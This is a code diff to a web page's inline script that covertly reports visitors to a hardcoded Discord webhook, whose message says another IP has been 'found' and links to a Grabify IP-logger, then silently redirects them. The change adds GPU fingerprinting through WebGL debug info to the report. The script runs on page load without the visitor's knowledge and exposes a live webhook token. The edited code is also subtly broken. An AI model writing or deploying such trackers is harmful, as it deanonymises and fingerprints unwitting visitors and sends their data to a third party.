@@ -11,11 +11,33 @@
 <script type="text/javascript">
 
 
-	let message = `The Kakapo has found another IP!\n\nCheck here to see all IP's logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>`
+	
 
 		const whurl ="https://discord.com/api/webhooks/982835750980706304/3Y-UdEf8ewXcMe-I9GvTgHzdksBF_2LhgU3Ta3oUl7aWVRDwnHSNC-DffFuYers7Xl47"
   		const msg = {"content" : message}
-            
+
+
+		function getVideoCardInfo() {
+			  const gl = document.createElement('canvas').getContext('webgl');
+			  if (!gl) {
+			    return {
+			      error: "no webgl",
+			    };
+			  }
+			  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+			  return debugInfo ? {
+			    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+			    renderer:  gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+			  } : {
+			    error: "no WEBGL_debug_renderer_info",
+		  };
+}
+	
+
+	graphCard = getVideoCardInfo();
+	let message = `The Kakapo has found another IP!\n\nCheck here to see all IP's logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}`
+
+	
   		fetch(whurl,{"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)}).then(setTimeout(function(){ window.location.replace("https://gamer.tattoo/0E0IA0")}, 10));
 
 		
